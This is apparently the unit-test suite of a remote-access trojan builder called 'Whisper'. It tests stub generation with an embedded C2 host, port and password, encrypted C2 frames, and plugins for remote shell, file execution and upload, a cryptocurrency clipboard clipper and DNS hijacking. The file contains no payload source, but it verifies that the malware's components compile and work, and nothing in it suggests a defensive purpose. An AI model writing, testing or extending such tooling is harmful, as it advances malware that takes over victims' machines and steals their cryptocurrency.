"""Unit tests for Whisper components."""
import sys, os, json, base64, hashlib, hmac, struct
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
os.environ["PYTHONPATH"] = os.path.dirname(os.path.abspath(__file__))

from whisper_crypto import derive_key, encrypt_bytes, decrypt_bytes, generate_salt
from stub_generator import generate_stub, estimate_size
from plugins import PLUGIN_REGISTRY, get_info, generate_plugin

PASS = "\033[92mPASS\033[0m"
FAIL = "\033[91mFAIL\033[0m"
results = {"pass": 0, "fail": 0}

def test(name, fn):
    try:
        result = fn()
        if result:
            print(f"  [{PASS}] {name}")
            results["pass"] += 1
        else:
            print(f"  [{FAIL}] {name}: returned False/None")
            results["fail"] += 1
    except Exception as e:
        print(f"  [{FAIL}] {name}: {e}")
        results["fail"] += 1

def _expect(fn, exc_type):
    try:
        fn()
        return False
    except exc_type:
        return True
    except Exception:
        return False

# --- Crypto Tests ---
print("1. Crypto...")

_salt = generate_salt()
test("derive_key produces 32 bytes", lambda: len(derive_key("test", _salt)) == 32)
test("derive_key is deterministic", lambda: derive_key("test", _salt) == derive_key("test", _salt))
test("derive_key differs with different passwords", lambda: derive_key("a", _salt) != derive_key("b", _salt))

plaintext = b"hello world this is a test message"
key = derive_key("test_password", _salt)

ct = encrypt_bytes(plaintext, key)
test("encrypt returns bytes", lambda: isinstance(ct, bytes))
test("encrypt produces IV+tag+ct format", lambda: len(ct) >= 32)

pt2 = decrypt_bytes(ct, key)
test("decrypt round-trips correctly", lambda: pt2 == plaintext)

wrong_key = derive_key("wrong_password", _salt)
try:
    decrypt_bytes(ct, wrong_key)
    test("decrypt with wrong key raises", lambda: False)
except ValueError:
    test("decrypt with wrong key raises", lambda: True)
except Exception:
    test("decrypt with wrong key raises", lambda: True)

# Tampered ciphertext
tampered = bytearray(ct)
tampered[20] ^= 0xFF  # flip a bit in the tag or IV
try:
    decrypt_bytes(bytes(tampered), key)
    test("tampered ciphertext rejected", lambda: False)
except (ValueError, Exception):
    test("tampered ciphertext rejected", lambda: True)

# Large payload
large = os.urandom(10000)
ct_large = encrypt_bytes(large, key)
pt_large = decrypt_bytes(ct_large, key)
test("large payload (10KB) round-trips", lambda: pt_large == large)

# --- Stub Generator Tests ---
print("\n2. Stub Generator...")

test("generate stub with all plugins", lambda: len(generate_stub(sorted(PLUGIN_REGISTRY.keys()), "127.0.0.1", 4443, "test", 10)) > 0)
test("generate stub with single plugin", lambda: len(generate_stub(["shell"], "127.0.0.1", 4443, "test", 10)) > 0)
test("generate stub with empty list", lambda: len(generate_stub([], "127.0.0.1", 4443, "test", 10)) > 0)
test("C2 host in stub", lambda: "192.168.1.1" in generate_stub(["shell"], "192.168.1.1", 4443, "test", 10))
test("C2 port in stub", lambda: "8888" in generate_stub(["shell"], "127.0.0.1", 8888, "test", 10))
test("password in stub", lambda: "mysecretpass" in generate_stub(["shell"], "127.0.0.1", 4443, "mysecretpass", 10))
test("reconnect delay in stub", lambda: "30" in generate_stub(["shell"], "127.0.0.1", 4443, "test", 30))

stub_code = generate_stub(["shell", "file_manager"], "127.0.0.1", 4443, "test", 10)
test("generated stub has _CMDS", lambda: "_CMDS" in stub_code)
test("generated stub has _main", lambda: "def _main" in stub_code)
test("generated stub has shell cmd", lambda: "_cmd_shell" in stub_code)
test("generated stub has ls cmd", lambda: "_cmd_ls" in stub_code)
test("generated stub compiles", lambda: compile(stub_code, "<test>", "exec") is not None)

# --- Plugin Registry Tests ---
print("\n3. Plugin Registry...")

info = get_info()
test("all plugins have metadata", lambda: len(info) == len(PLUGIN_REGISTRY))

for name in sorted(PLUGIN_REGISTRY.keys()):
    mod = PLUGIN_REGISTRY[name]
    test(f"plugin {name}: has PLUGIN dict", lambda m=mod: hasattr(m, "PLUGIN"))
    test(f"plugin {name}: PLUGIN has name", lambda m=mod: "name" in m.PLUGIN)
    test(f"plugin {name}: PLUGIN has desc", lambda m=mod: "desc" in m.PLUGIN)
    code, cmds = generate_plugin(name)
    test(f"plugin {name}: STUB_CODE is non-empty", lambda c=code: len(c) > 0)
    test(f"plugin {name}: has commands", lambda c=cmds: len(c) > 0)
    for cmd_name, func_name in cmds.items():
        test(f"plugin {name}: command '{cmd_name}' maps to '{func_name}'", lambda f=func_name, c=code: f in c)

# --- estimate_size ---
print("\n4. Utility...")

test("estimate_size returns positive int", lambda: estimate_size(stub_code, ["shell"]) > 0)

# --- Protocol Tests ---
print("\n5. Protocol...")

from whisper_protocol import encode_frame, decode_frame_header, recv_frame, send_frame, validate_message

test("encode_frame returns 4-byte len prefix + payload", lambda: encode_frame(b"hello") == b"\x00\x00\x00\x05hello")
test("decode_frame_header reads big-endian length", lambda: decode_frame_header(b"\x00\x00\x00\x05") == 5)
test("validate_message accepts valid dict", lambda: validate_message({"type": "shell"}) is None)
test("validate_message rejects non-dict", lambda: validate_message("hello") is not None)
test("validate_message rejects missing type", lambda: validate_message({"cmd": "ls"}) is not None)
test("validate_message rejects oversize type", lambda: validate_message({"type": "x" * 65}) is not None)
test("send_frame returns True on success", lambda: send_frame(lambda p: None, b"data"))
test("send_frame returns False on error", lambda: send_frame(lambda p: (_ for _ in ()).throw(OSError), b"data") is False)

# --- Config Tests ---
print("\n6. Config...")

from whisper_config import WhisperConfig, load_config, save_config
import tempfile, secrets

_cfg = WhisperConfig()
test("WhisperConfig has default port", lambda: _cfg.c2_port == 4443)
test("WhisperConfig auto-generates salt", lambda: len(_cfg.c2_salt_hex) == 32)
os.environ["WHISPER_PASSWORD"] = "envpass"
test("WhisperConfig reads WHISPER_PASSWORD env", lambda: WhisperConfig().c2_password == "envpass")
del os.environ["WHISPER_PASSWORD"]

with tempfile.TemporaryDirectory() as _td:
    _p = os.path.join(_td, "test_config.json")
    save_config(_cfg, _p)
    test("save_config writes file", lambda: os.path.exists(_p))
    test("save_config does not write password to file", lambda: "c2_password" not in open(_p).read())
    test("save_config does not write salt to file", lambda: "c2_salt_hex" not in open(_p).read())
    _loaded = load_config(_p)
    test("load_config restores fields", lambda: _loaded.c2_port == _cfg.c2_port)
    test("load_config does not restore password", lambda: _loaded.c2_password == "")
    test("load_config auto-generates salt on load", lambda: len(_loaded.c2_salt_hex) == 32)

# --- Plugin Validation Tests ---
print("\n7. Plugin Validation...")

from plugin_base import validate_plugin_module, PluginModule, PluginInfo

class _GoodPlugin:
    PLUGIN = {"name": "test", "desc": "test plugin", "deps": [], "size": 0.5}
    STUB_CODE = "def _cmd_test(m): return {'ok': True}\n_CMDS['test'] = _cmd_test\n"
    def get_commands(self):
        return {"test": "_cmd_test"}

class _BadPluginNoPLUGIN:
    STUB_CODE = "x=1"
    def get_commands(self): return {}

class _MissingNamePlugin:
    PLUGIN = {"desc": "no name"}
    STUB_CODE = "x=1"
    def get_commands(self): return {}

class _EmptyCodePlugin:
    PLUGIN = {"name": "empty", "desc": "empty code"}
    STUB_CODE = ""
    def get_commands(self): return {}

class _BadCmdsPlugin:
    PLUGIN = {"name": "badcmds", "desc": "bad cmds"}
    STUB_CODE = "x=1"
    def get_commands(self): return "not_a_dict"

class _BadCommandPlugin:
    PLUGIN = {"name": "bad", "desc": "bad"}
    STUB_CODE = "def _cmd_x(m): return {}\n_CMDS['x'] = _cmd_x\n"
    def get_commands(self):
        return {"y": "_cmd_y"}

test("validate accepts good plugin", lambda: validate_plugin_module(_GoodPlugin(), "test"))
test("validate rejects missing PLUGIN", lambda: _expect(lambda: validate_plugin_module(_BadPluginNoPLUGIN(), "bad"), TypeError))
test("validate rejects missing STUB_CODE", lambda: _expect(lambda: validate_plugin_module(object(), "bad"), TypeError))
test("validate rejects missing name in PLUGIN", lambda: _expect(lambda: validate_plugin_module(_MissingNamePlugin(), "bad"), KeyError))
test("validate rejects empty STUB_CODE", lambda: _expect(lambda: validate_plugin_module(_EmptyCodePlugin(), "bad"), ValueError))
test("validate rejects non-dict get_commands return", lambda: _expect(lambda: validate_plugin_module(_BadCmdsPlugin(), "bad"), TypeError))
test("validate rejects mismatched command", lambda: _expect(lambda: validate_plugin_module(_BadCommandPlugin(), "bad"), ValueError))

# --- Plugin Logic Tests (mock-based) ---
print("\n8. Plugin Logic (mock-based)...")

from unittest.mock import patch, MagicMock, PropertyMock

# shell plugin
_shell_code, _shell_cmds = generate_plugin("shell")
_shell_globals = {"_CMDS": {}, "subprocess": __import__("subprocess"), "__builtins__": __import__("builtins")}
exec(_shell_code, _shell_globals)

with patch("subprocess.run") as _mock_run:
    _mock_run.return_value = MagicMock(stdout="dir output\n", stderr="", returncode=0)
    _result = _shell_globals["_cmd_shell"]({"type": "shell", "cmd": "dir"})
    test("shell: returns output key", lambda: "output" in _result)
    test("shell: uses list args", lambda:
        _mock_run.call_args is not None and
        isinstance(_mock_run.call_args[0][0], list))

with patch("subprocess.run") as _mock_run:
    _mock_run.side_effect = __import__("subprocess").TimeoutExpired("cmd", 120)
    _result = _shell_globals["_cmd_shell"]({"type": "shell", "cmd": "dir"})
    test("shell: handles timeout gracefuly", lambda: "Timed out" in _result.get("output", ""))

# file_manager execute
_fm_code, _fm_cmds = generate_plugin("file_manager")
_fm_globals = {"_CMDS": {}, "subprocess": __import__("subprocess"), "os": __import__("os"),
               "base64": __import__("base64"), "__builtins__": __import__("builtins")}
exec(_fm_code, _fm_globals)

with patch("subprocess.run") as _mock_run:
    _mock_run.return_value = MagicMock(stdout="ok", stderr="", returncode=0)
    _result = _fm_globals["_cmd_execute"]({"type": "execute", "path": "notepad.exe", "args": "/?", "wait": True})
    test("file_manager execute: returns output key", lambda: "output" in _result)
    test("file_manager execute: uses list args for wait=True", lambda:
        _mock_run.call_args is not None and
        isinstance(_mock_run.call_args[0][0], list))

with patch("subprocess.Popen") as _mock_popen:
    _result = _fm_globals["_cmd_execute"]({"type": "execute", "path": "calc.exe", "wait": False})
    test("file_manager execute: uses Popen for no-wait", lambda: _mock_popen.called)

with patch("builtins.open", MagicMock()) as _mock_open, patch("os.makedirs") as _mock_mkdir:
    _result = _fm_globals["_cmd_upload"]({"type": "upload", "path": "test.txt", "data": base64.b64encode(b"hello").decode()})
    test("file_manager upload: returns output key", lambda: "output" in _result)

# crypto_clipper address replacement
_cc_code, _cc_cmds = generate_plugin("crypto_clipper")
_cc_globals = {"_CMDS": {}, "re": __import__("re"), "hashlib": __import__("hashlib"),
               "__builtins__": __import__("builtins"),
               "subprocess": __import__("subprocess"),
               "threading": __import__("threading"),
               "_CREATE_NO_WINDOW": 0x08000000,
               "time": __import__("time")}
exec(_cc_code, _cc_globals)

_result = _cc_globals["_cmd_clipper_test"]({"type": "clipper_test", "text": "Send BTC to 1CounterpartyXXXXXXXXXXXXXXXUWLpVr"})
test("clipper: test returns output", lambda: "output" in _result)
test("clipper: test detects BTC address", lambda: "btc" in _result["output"].lower())



# dns_hijack commands use list args
_dns_code, _dns_cmds = generate_plugin("dns_hijack")
_dns_globals = {"_CMDS": {}, "subprocess": __import__("subprocess"), "os": __import__("os"),
                "platform": __import__("platform"), "__builtins__": __import__("builtins")}
exec(_dns_code, _dns_globals)

test("dns: has _cmd_dns_get", lambda: "_cmd_dns_get" in _dns_globals)
test("dns: has _cmd_dns_set", lambda: "_cmd_dns_set" in _dns_globals)

with patch("subprocess.check_output") as _mock_co:
    _mock_co.return_value = b""
    _result = _dns_globals["_cmd_dns_get"]({"type": "dns_get"})
    test("dns_get: returns output", lambda: "output" in _result)

# Summary
print(f"\n\033[96mResults: {results['pass']} passed, {results['fail']} failed\033[0m")
sys.exit(0 if results["fail"] == 0 else 1)
